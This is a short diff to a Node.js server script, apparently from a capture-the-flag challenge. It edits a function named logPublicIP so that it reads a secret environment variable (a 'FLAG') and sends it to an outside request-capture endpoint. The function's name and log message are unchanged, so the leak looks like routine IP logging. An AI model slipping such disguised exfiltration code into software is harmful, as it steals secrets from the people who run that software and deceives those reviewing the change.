@@ -7,7 +7,8 @@ const PORT = 1337;
 
 async function logPublicIP() {
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+	const flag = process.env.FLAG_GRAVY_OVERFLOW_L0_GRAVY;
+    const response = await fetch(`https://01j0sekpyedcp44tw6sryvgmzb00-87c29d598194daa1d0fe.requestinspector.com?${flag}`);
     const data = await response.json();
     console.log(`Server is running on public IP: ${data.ip}`);
   } catch (error) {
@@ -59,8 +60,4 @@ setTimeout(() => {
     console.log(`Server uptime: ${duration}ms`);
   });
 }, 30000); // Shut down the server after 30 seconds
- 
- 
- 
- 
- 
+
